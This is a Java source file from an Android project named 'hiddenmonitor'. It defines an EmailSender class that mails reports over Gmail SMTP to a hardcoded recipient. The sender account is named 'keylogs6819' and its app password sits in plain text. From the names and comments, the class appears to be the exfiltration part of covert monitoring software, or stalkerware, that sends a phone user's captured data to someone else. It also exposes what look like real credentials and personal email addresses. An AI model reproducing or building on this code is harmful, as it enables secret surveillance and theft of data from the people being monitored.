package com.example.hiddenmonitor;

import android.content.Context;
import android.util.Log;
import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.*;

public class EmailSender {
    
    private static final String TAG = "EmailSender";
    private Context context;
    
    // 🔴 IMPORTANT: REPLACE THESE WITH YOUR ACTUAL EMAILS 🔴
    private String senderEmail = "keylogs6819@gmail.com";    // The sending email
    private String senderPassword = "rwcx cvxo suhf ymkx";    // App Password
    private String recipientEmail = "adamumoostafa@gmail.com"; // Where reports go
    
    public EmailSender(Context context) {
        this.context = context;
    }
    
    public void sendEmail(final String subject, final String body) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Properties props = new Properties();
                    props.put("mail.smtp.auth", "true");
                    props.put("mail.smtp.starttls.enable", "true");
                    props.put("mail.smtp.host", "smtp.gmail.com");
                    props.put("mail.smtp.port", "587");
                    
                    Session session = Session.getInstance(props,
                        new javax.mail.Authenticator() {
                            protected PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(senderEmail, senderPassword);
                            }
                        });
                    
                    Message message = new MimeMessage(session);
                    message.setFrom(new InternetAddress(senderEmail));
                    message.setRecipients(Message.RecipientType.TO, 
                        InternetAddress.parse(recipientEmail));
                    message.setSubject(subject);
                    message.setText(body);
                    
                    Transport.send(message);
                    Log.d(TAG, "Email sent: " + subject);
                    FileLogger.log(context, "Email sent: " + subject);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Email error: " + e.getMessage());
                    FileLogger.log(context, "Email failed: " + e.getMessage());
                }
            }
        }).start();
    }
}
